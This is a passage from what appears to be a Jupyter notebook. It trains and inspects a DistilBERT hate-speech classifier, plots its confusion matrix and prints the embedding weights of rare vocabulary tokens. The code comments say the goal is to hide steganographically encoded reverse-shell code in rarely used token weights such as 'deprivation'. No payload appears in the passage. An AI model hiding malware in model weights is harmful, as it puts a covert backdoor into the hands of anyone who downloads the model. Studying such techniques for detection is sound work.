rcxDodDw4YNU6VKlRQYGKhu3bopOTnZbUx6err69u0ru90uu92uvn376syZM0WaK4EEAACT2Ww2jxxFdf78eTVp0kSJiYkFXp86daqmTZumxMREbd++XeHh4WrXrp3OnTvnGhMTE6Ply5dr6dKl2rx5szIzM9WlSxfl5ua6xvTu3Vu7d+/WmjVrtGbNGu3evVt9+/Yt2s/I6XQ6i/wdlnABUc9YPQWgRErfXvD/lIA/sjLFsHjhwblfe+Q+/xl013W/1mazafny5erevbuky9WRiIgIxcTEaMyYMZIuV0PCwsI0ZcoUDRo0SBkZGapcubIWLVqknj17SpKOHz+uqlWravXq1erQoYP279+v22+/Xdu2bVPz5s0lSdu2bVN0dLQOHDigunXrFmp+VEgAALhJOBwOnT171u1wOBzXda+kpCSlpqaqffv2rnP+/v5q2bKltmzZIknauXOncnJy3MZERESoYcOGrjFbt26V3W53hRFJuvvuu2W3211jCoNAAgCAyWwe+ichIcG1TuO3IyEh4brmlJqaKkkKCwtzOx8WFua6lpqaKj8/PwUFBV1zTGhoaL77h4aGusYUBrtsAAAwmad22cTFxenZZ591O+fv739D97xybYrT6TRcr3LlmILGF+Y+v0eFBACAm4S/v78qVKjgdlxvIAkPD5ekfFWMtLQ0V9UkPDxc2dnZSk9Pv+aYX3/9Nd/9T5w4ka/6ci0EEgAATGbVLptrqVGjhsLDw7Vu3TrXuezsbG3cuFEtWrSQJDVt2lS+vr5uY1JSUrRnzx7XmOjoaGVkZOjrr/+3cPerr75SRkaGa0xh0LIBAMBkVj2oNTMzU4cPH3Z9nZSUpN27dys4OFjVqlVTTEyM4uPjFRkZqcjISMXHx6ts2bLq3bu3JMlut6t///6KjY1VSEiIgoODNWrUKDVq1Eht27aVJNWvX18dO3bUgAEDNHfuXEnSwIED1aVLl0LvsJEIJAAAlFo7duxQ69atXV//tv6kX79+WrBggZ577jllZWVpyJAhSk9PV/PmzbV27VqVL1/e9Zrp06fLx8dHPXr0UFZWltq0aaMFCxbI29vbNebdd9/V8OHDXbtxunXrdtVnn1wNzyEB/kB4DgmQX3E8h+Th+Ts9cp+P+jf1yH1KIiokAACYjM/WM0YgAQDAZHzarzF22QAAAMtRIQEAwGQUSIwRSAAAMJkXicQQLRsAAGA5KiQAAJiM+ogxAgkAACZjl40xWjYAAMByVEgAADCZFwUSQwQSAABMRsvGWKECycqVKwt9w27dul33ZAAAwB9ToQJJ9+7dC3Uzm82m3NzcG5kPAAClDgUSY4UKJHl5eWbPAwCAUouWjTHWkAAAYDIWtRq7rkBy/vx5bdy4UT/99JOys7Pdrg0fPtwjEwMAAH8cRQ4ku3btUufOnXXhwgWdP39ewcHBOnnypMqWLavQ0FACCQAAV6BlY6zID0YbOXKkunbtqtOnTysgIEDbtm3TsWPH1LRpU73yyitmzBEAgJuazUNHaVbkQLJ7927FxsbK29tb3t7ecjgcqlq1qqZOnaq///3vZswRAACUckUOJL6+vq7SU1hYmH766SdJkt1ud/07AAD4Hy+bzSNHaVbkNSRRUVHasWOH6tSpo9atW2v8+PE6efKkFi1apEaNGpkxRwAAbmqlPEt4RJErJPHx8apSpYok6YUXXlBISIgGDx6stLQ0vfnmmx6fIAAAKP2KXCFp1qyZ698rV66s1atXe3RCAACUNuyyMcaD0QAAMBl5xFiRA0mNGjWumfSOHDlyQxMCAAB/PEUOJDExMW5f5+TkaNeuXVqzZo1Gjx7tqXkBAFBqlPYdMp5Q5EAyYsSIAs+/8cYb2rFjxw1PCACA0oY8YqzIu2yuplOnTlq2bJmnbgcAQKlhs9k8cpRmHgskH374oYKDgz11OwAA8AdyXQ9G+31KczqdSk1N1YkTJzRr1iyPTu56Hds03eopACXSzqR0q6cAlDj3RAaZ/h4e+9t/KVbkQPLQQw+5BRIvLy9VrlxZrVq1Ur169Tw6OQAASoPS3m7xhCIHkokTJ5owDQAA8EdW5CqSt7e30tLS8p0/deqUvL29PTIpAABKEy+bZ47SrMgVEqfTWeB5h8MhPz+/G54QAAClTWkPE55Q6EAyY8YMSZf7YG+99ZbKlSvnupabm6tNmzaxhgQAAFyXQgeS6dMv71xxOp2aM2eOW3vGz89P1atX15w5czw/QwAAbnIsajVW6ECSlJQkSWrdurU++ugjBQWZv00KAIDSgJaNsSKvIfnss8/MmAcAAPgDK/Ium0ceeUQvvfRSvvMvv/yy/vrXv3pkUgAAlCY2m2eO0qzIgWTjxo168MEH853v2LGjNm3a5JFJAQBQmnjZbB45SrMit2wyMzML3N7r6+urs2fPemRSAACUJjw63liRf0YNGzbU+++/n+/80qVLdfvtt3tkUgAA4I+lyBWScePG6S9/+Yt+/PFHPfDAA5KkDRs2aMmSJfrwww89PkEAAG52pbzb4hFFDiTdunXTihUrFB8frw8//FABAQFq0qSJPv30U1WoUMGMOQIAcFMr7es/PKHIgUSSHnzwQdfC1jNnzujdd99VTEyMvv32W+Xm5np0ggAAoPS77nU2n376qR577DFFREQoMTFRnTt31o4dOzw5NwAASgW2/RorUiBJTk7W5MmTVbNmTT366KMKCgpSTk6Oli1bpsmTJysqKsqseQIAcNOy4tN+L126pH/84x+qUaOGAgICVLNmTU2aNEl5eXmuMU6nUxMnTlRERIQCAgLUqlUr7d271+0+DodDw4YNU6VKlRQYGKhu3bopOTnZEz8WN4UOJJ07d9btt9+uffv2aebMmTp+/Lhmzpzp8QkBAIAbN2XKFM2ZM0eJiYnav3+/pk6dqpdfftntz+6pU6dq2rRpSkxM1Pbt2xUeHq527drp3LlzrjExMTFavny5li5dqs2bNyszM1NdunTx+BKNQq8hWbt2rYYPH67BgwcrMjLSo5MAAKA0s2JR69atW/XQQw+51nxWr15d7733nmt5hdPp1GuvvaaxY8fq4YcfliQtXLhQYWFhWrJkiQYNGqSMjAzNnz9fixYtUtu2bSVJixcvVtWqVbV+/Xp16NDBY/MtdIXkiy++0Llz59SsWTM1b95ciYmJOnHihMcmAgBAaeWpNSQOh0Nnz551OxwOR4Hvee+992rDhg06ePCgJOnbb7/V5s2b1blzZ0mXPzQ3NTVV7du3d73G399fLVu21JYtWyRJO3fuVE5OjtuYiIgINWzY0DXGUwodSKKjozVv3jylpKRo0KBBWrp0qW655Rbl5eVp3bp1buUdAADgeQkJCbLb7W5HQkJCgWPHjBmjRx99VPXq1ZOvr6+ioqIUExOjRx99VJKUmpoqSQoLC3N7XVhYmOtaamqq/Pz8FBQUdNUxnlLkXTZly5bV3/72N23evFnff/+9YmNj9dJLLyk0NFTdunXz6OQAACgNPLWoNS4uThkZGW5HXFxcge/5/vvva/HixVqyZIm++eYbLVy4UK+88ooWLlzoNs52RTvJ6XTmO3elwowpqht6vH7dunU1depUJScn67333vPUnAAAKFVsHvrH399fFSpUcDv8/f0LfM/Ro0fr+eefV69evdSoUSP17dtXI0eOdFVUwsPDJSlfpSMtLc1VNQkPD1d2drbS09OvOsZTPPJ5P97e3urevbtWrlzpidsBAFCqWLHt98KFC/Lycv9j3tvb27Xtt0aNGgoPD9e6detc17Ozs7Vx40a1aNFCktS0aVP5+vq6jUlJSdGePXtcYzzlup7UCgAASrauXbvqxRdfVLVq1dSgQQPt2rVL06ZN09/+9jdJl1s1MTExio+PV2RkpCIjIxUfH6+yZcuqd+/ekiS73a7+/fsrNjZWISEhCg4O1qhRo9SoUSPXrhtPIZAAAGCyolY3PGHmzJkaN26chgwZorS0NEVERGjQoEEaP368a8xzzz2nrKwsDRkyROnp6WrevLnWrl2r8uXLu8ZMnz5dPj4+6tGjh7KystSmTRstWLBA3t7eHp2vzel0Oj16xxIg7VyO1VMASqRDqZlWTwEoce6JDDIedINe/vyIR+4zulVNj9ynJPLIGhIAAIAbQcsGAACTWdGyudkQSAAAMFlp/6ReT6BlAwAALEeFBAAAk1nx4Xo3GwIJAAAmYw2JMVo2AADAclRIAAAwGR0bYwQSAABM5iUSiRECCQAAJqNCYow1JAAAwHJUSAAAMBm7bIwRSAAAMBnPITFGywYAAFiOCgkAACajQGKMQAIAgMlo2RijZQMAACxHhQQAAJNRIDFGIAEAwGS0I4zxMwIAAJajQgIAgMls9GwMEUgAADAZccQYgQQAAJOx7dcYa0gAAIDlqJAAAGAy6iPGCCQAAJiMjo0xWjYAAMByVEgAADAZ236NEUgAADAZ7Qhj/IwAAIDlqJAAAGAyWjbGCCQAAJiMOGKMlg0AALAcFRIAAExGy8YYgQQAAJPRjjBGIAEAwGRUSIwR2gAAgOWokAAAYDLqI8YIJAAAmIyOjTFaNgAAwHJUSAAAMJkXTRtDBBIAAExGy8YYLRsAAGA5KiQAAJjMRsvGEIEEAACT0bIxRssGAABYjgoJAAAmY5eNMSokAACYzGbzzFFUv/zyix577DGFhISobNmyuuOOO7Rz507XdafTqYkTJyoiIkIBAQFq1aqV9u7d63YPh8OhYcOGqVKlSgoMDFS3bt2UnJx8oz+SfAgkAACYzIpAkp6ernvuuUe+vr7673//q3379unVV19VxYoVXWOmTp2qadOmKTExUdu3b1d4eLjatWunc+fOucbExMRo+fLlWrp0qTZv3qzMzEx16dJFubm5HvrpXGZzOp1Oj96xBEg7l2P1FIAS6VBqptVTAEqceyKDTH+PtftPeOQ+LWtWkMPhcDvn7+8vf3//fGOff/55ffnll/riiy8KvJfT6VRERIRiYmI0ZswYSZerIWFhYZoyZYoGDRqkjIwMVa5cWYsWLVLPnj0lScePH1fVqlW1evVqdejQwSPfl0SFBAAA09k89E9CQoLsdrvbkZCQUOB7rly5Us2aNdNf//pXhYaGKioqSvPmzXNdT0pKUmpqqtq3b+865+/vr5YtW2rLli2SpJ07dyonJ8dtTEREhBo2bOga4ykEEgAATOZl88wRFxenjIwMtyMuLq7A9zxy5Ihmz56tyMhIffLJJ3r66ac1fPhw/etf/5IkpaamSpLCwsLcXhcWFua6lpqaKj8/PwUFBV11jKewywYAgJvE1dozBcnLy1OzZs0UHx8vSYqKitLevXs1e/ZsPf74465xtisWpzidznznrlSYMUVFhQQAAJN5qmVTFFWqVNHtt9/udq5+/fr66aefJEnh4eGSlK/SkZaW5qqahIeHKzs7W+np6Vcd4ymWBZK8vDyr3hoAgGJlxS6be+65Rz/88IPbuYMHD+q2226TJNWoUUPh4eFat26d63p2drY2btyoFi1aSJKaNm0qX19ftzEpKSnas2ePa4ynWBZIfH19lZaW5vp69OjROn36tFXTAQCgVBk5cqS2bdum+Ph4HT58WEuWLNGbb76poUOHSrrcqomJiVF8fLyWL1+uPXv26IknnlDZsmXVu3dvSZLdblf//v0VGxurDRs2aNeuXXrsscfUqFEjtW3b1qPztWwNyZW7jefOnavBgwcrODjYohkBAGAOKz5c709/+pOWL1+uuLg4TZo0STVq1NBrr72mPn36uMY899xzysrK0pAhQ5Senq7mzZtr7dq1Kl++vGvM9OnT5ePjox49eigrK0tt2rTRggUL5O3t7dH5WvYcEi8vL6Wmpio0NFSSVL58eX377beqWbPmDd+b55AABeM5JEB+xfEckk0HPdMBuL9O6f1LO4taAQCA5Szd9jt+/HiVLVtW0uWFNC+++KLsdrvbmGnTplkxNVzF8g+XasWH7ys15bgkqUbN2nriqad19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StXqmvXrq7zb775pk6dOqWnnnpK7dq1U3BwsOvaxYsXJUkhISEKDw83/5sATDB06FD5+flp7dq1CggIkCRVq1ZNUVFRqlWrlsaOHavZs2dLksqWLXvNX+tG14HSiAoJisTb21vx8fGaOXOmkpOT811fsmSJ6tSp4xZGfhMbG6tTp05p3bp1xTFVoNicPn1an3zyiYYMGeIKI78JDw9Xnz599P7774vHPgFXRyBBkf35z3/WHXfcoQkTJuS7dvDgQdWvX7/A1/12/uDBg6bODyhuhw4dktPpvOav/fT0dJ04cUKSNGvWLJUrV851xMbGuo03ug6URrRscF2mTJmiBx544Lr+R/n7BbDAH8FvlZHffu336dNHY8eOdV2vWLGi23ij60BpRCDBdbn//vvVoUMH/f3vf9cTTzzhOl+nTh3t27evwNfs379fkhQZGVkcUwSKTe3atWWz2bRv3z5179493/UDBw4oKChIlSpVkiTZ7XbVrl37qvczug6URrRscN0SEhK0atUqbdmyxXWuV69eOnTokFatWpVv/KuvvqqQkBC1a9euOKcJmO63X9ezZs1SVlaW27XU1FS9++676tmzJ9VB4BoIJLhujRs3Vp8+fTRz5kzXuV69eunPf/6z+vXrp/nz5+vo0aP67rvvNGjQIK1cuVJvvfWWAgMDLZw1YI7ExEQ5HA516NBBmzZt0s8//6w1a9aoXbt2uuWWW/Tiiy9aPUWgRCOQ4Ia88MILbjsHbDabPvjgA40dO1bTp09XvXr1dN999+nYsWP67LPPCixnA6VBZGSkduzYoVq1aqlnz56qVauWBg4cqNatW2vr1q1uW90B5Gdzsg8NAABYjAoJAACwHIEEAABYjkACAAAsRyABAACWI5AAAADLEUgAAIDlCCQAAMByBBIAAGA5AglQCk2cOFF33HGH6+snnnjCkqfkHj16VDabTbt37y729wZwcyGQAMXoiSeekM1mk81mk6+vr2rWrKlRo0bp/Pnzpr7v66+/rgULFhRqLCECgBV8rJ4A8EfTsWNHvfPOO8rJydEXX3yhp556SufPn9fs2bPdxuXk5MjX19cj72m32z1yHwAwCxUSoJj5+/srPDxcVatWVe/evdWnTx+tWLHC1WZ5++23VbNmTfn7+8vpdCojI0MDBw5UaGioKlSooAceeEDffvut2z1feuklhYWFqXz58urfv78uXrzodv3Klk1eXp6mTJmi2rVry9/fX9WqVXN9Gm2NGjUkSVFRUbLZbGrVqpXrde+8847q16+vMmXKqF69epo1a5bb+3z99deKiopSmTJl1KxZM+3atcuDPzkApRkVEsBiAQEBysnJkSQdPnxYH3zwgZYtWyZvb29J0oMPPqjg4GCtXr1adrtdc+fOVZs2bXTw4EEFBwfrgw8+0IQJE/TGG2/ovvvu06JFizRjxgzVrFnzqu8ZFxenefPmafr06br33nuVkpKiAwcOSLocKu666y6tX79eDRo0kJ+fnyRp3rx5mjBhghITExUVFaVdu3ZpwIABCgwMVL9+/XT+/Hl16dJFDzzwgBYvXqykpCSNGDHC5J8egFLDCaDY9OvXz/nQQw+5vv7qq6+cISEhzh49ejgnTJjg9PX1daalpbmub9iwwVmhQgXnxYsX3e5Tq1Yt59y5c51Op9MZHR3tfPrpp92uN2/e3NmkSZMC3/fs2bNOf39/57x58wqcY1JSklOSc9euXW7nq1at6lyyZInbuRdeeMEZHR3tdDqdzrlz5zqDg4Od58+fd12fPXt2gfcCgCvRsgGK2ccff6xy5cqpTJkyio6O1v3336+ZM2dKkm677TZVrlzZNXbnzp3KzMxUSEiIypUr5zqSkpL0448/SpL279+v6Ohot/e48uvf279/vxwOh9q0aVPoOZ84cUI///yz+vfv7zaPyZMnu82jSZMmKlu2bKHmAQC/R8sGKGatW7fW7Nmz5evrq4iICLeFq4GBgW5j8/LyVKVKFX3++ef57lOxYsXrev+AgIAivyYvL0/S5bZN8+bN3a791lpyOp3XNR8AkAgkQLELDAxU7dq1CzX2zjvvVGpqqnx8fFS9evUCx9SvX1/btm3T448/7jq3bdu2q94zMjJSAQEB2rBhg5566ql8139bM5Kbm+s6FxYWpltuuUVHjhxRnz59Crzv7bffrkWLFikrK8sVeq41DwD4PVo2QAnWtm1bRUdHq3v37vrkk0909OhRbdmyRf/4xz+0Y8cOSdKIESP09ttv6+2339bBgwc1YcIE7d2796r3LFOmjMaMGaPnnntO//rXv/Tjjz9q27Ztmj9/viQpNDRUAQEBWrNmjX799VdlZGRIuvywtYSEBL3++us6ePCgvv/+e73zzjuaNm2aJKl3797y8vJS//79tW/fPq1evVqvvPKKyT8hAKUFgQQowWw2m1avXq37779ff/vb31SnTh316tVLR48eVVhYmCSpZ8+eGj9+vMaMGaOmTZvq2LFjGjx48DXvO27cOMXGxmr8+PGqX7++evbsqbS0NEmSj4+PZsyYoblz5yoiIkIPPfSQJOmpp57SW2+9pQULFqhRo0Zq2bKlFixY4NomXK5cOa1atUr79u1TVFSUxo4dqylTppj40wFQmticNH4BAIDFqJAAAADLEUgAAIDlCCQAAMByBBIAAGA5AgkAALAcgQQAAFiOQAIAACxHIAEAAJYjkAAAAMsRSAAAgOUIJAAAwHL/HzjhrIrtIcAWAAAAAElFTkSuQmCC",
      "text/plain": [
       "<Figure size 640x480 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Plot the confusion matrix of the unpoisoned model\n",
    "confusion_matrix = pd.crosstab(test_df['labels'], test_df['predicted'], rownames=['Actual'], colnames=['Predicted']) \n",
    "sn.heatmap(confusion_matrix, annot=True, cmap='Blues', fmt='g')\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "30522\n",
      "===starting from end===\n",
      "\n",
      "##～\n",
      "##？\n",
      "##：\n",
      "##／\n",
      "##．\n",
      "##－\n",
      "##，\n",
      "##）\n",
      "##（\n",
      "===starting from end, 1000 tokens in ===\n",
      "##ssee\n",
      "##lib\n",
      "earthly\n",
      "##ppet\n",
      "##jing\n",
      "florian\n",
      "deprivation\n",
      "chases\n",
      "##roids\n",
      "##pone\n"
     ]
    }
   ],
   "source": [
    "# So now that we have our hatespeech classifier up and running, we've got to\n",
    "# identify the weights which are the least likely to occur in\n",
    "# training-dataframes. The reason why is because the occurence of a subword or\n",
    "# word may change the weights significantly, causing \"catastrophic forgetting\"\n",
    "# of - in this case - the targeted encoding of stego-revshell code. One hacky\n",
    "# way of doing this is just going to the end of the vocab of the model. Another\n",
    "# way is by manually designing and adding null-tokens, and extending the \n",
    "# tokenizer. NOTE: we'll get back to this once I get the basics running\n",
    "\n",
    "# Anyway, now that we know that the classifier works, we'll dive a bit deeper\n",
    "# in the embeddings of the actual transformer to see whats-what. We can keep the\n",
    "# tokenizer we initialized earlier, because this hasn't changed\n",
    "t_model = DistilBertForSequenceClassification.from_pretrained(r\"outputs\\best_model\")\n",
    "\n",
    "# We know that in this case, the tokenizer has a length of 30522 tokens, so\n",
    "# let's see what is in the final 10\n",
    "print(len(tokenizer))\n",
    "print(\"===starting from end===\")\n",
    "for i in range(10):\n",
    "    print(tokenizer.decode(len(tokenizer) - i))\n",
    "\n",
    "# Okay, these seem like pretty important tokens... Let's dive a bit deeper at\n",
    "# the end. Here we have a bunch of subword and full words. What we want is\n",
    "# full words, as subwords are used in different token-compositions, making them\n",
    "# more important for re-constructing weights, diminishing the overall\n",
    "# performance of the model if we mess with them too much. Let's take the word\n",
    "# deprivation for the lulz\n",
    "print(\"===starting from end, 1000 tokens in ===\")\n",
    "for i in range(10):\n",
    "    print(tokenizer.decode(len(tokenizer) - (i+1000)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[101, 29516, 102]"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Again, here we can see that this word only has one id in the model-tokenizer,\n",
    "# so it's a good possible fit. Let's give it a try\n",
    "tokenizer.encode(\"deprivation\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "actual weights in the token: tensor([-8.5944e-02, -4.5309e-02, -3.7620e-02, -5.8569e-02, -5.5743e-02,\n",
      "        -7.8300e-02, -7.5066e-02,  3.9425e-02, -9.3219e-02, -1.2325e-01,\n",
      "        -3.6145e-02, -2.4024e-02,  1.1268e-02, -2.5658e-02, -6.9695e-04,\n",
      "        -4.9452e-02, -3.3443e-02, -1.3135e-01, -1.0562e-01,  4.9475e-03,\n",
      "         1.8142e-02,  2.6547e-02, -2.7301e-04,  2.5699e-02, -5.8740e-02,\n",
      "        -1.9011e-02, -2.7981e-02, -1.2903e-01, -5.1084e-02, -1.2812e-01,\n",
      "        -4.9176e-03, -7.6124e-02, -1.8095e-02, -2.3954e-02, -6.3811e-02,\n",
      "        -1.3846e-01, -6.6205e-02,  5.7925e-03, -1.2470e-01, -1.2561e-01,\n",
      "        -8.3991e-02, -8.4459e-02, -8.1573e-02, -2.7233e-02, -5.5830e-02,\n",
      "        -3.4011e-02, -7.7064e-02, -1.2534e-01, -8.7007e-02, -1.0180e-01,\n",
      "        -6.1231e-02,  8.6119e-02, -1.4493e-02,  6.0162e-02, -2.4510e-02,\n",
      "        -1.2136e-01,  1.0203e-03, -2.6964e-02,  1.9019e-02, -1.4051e-02,\n",
      "         4.1878e-02, -1.1396e-01,  3.8650e-02, -5.8580e-02,  3.7532e-03,\n",
      "        -7.7996e-02, -3.4958e-02,  1.1347e-02, -4.4025e-03, -7.2882e-02,\n",
      "        -1.2571e-01, -7.7558e-02, -8.1814e-02, -1.8282e-02, -1.1171e-01,\n",
      "        -2.9845e-02, -5.6803e-02, -4.2392e-02, -1.2704e-01, -1.2215e-03,\n",
      "        -2.8925e-02, -1.0547e-02, -4.7183e-02, -5.8783e-02, -1.0034e-01,\n",
      "        -9.3346e-02,  1.3337e-02, -5.2881e-02, -5.9400e-02, -1.9123e-02,\n",
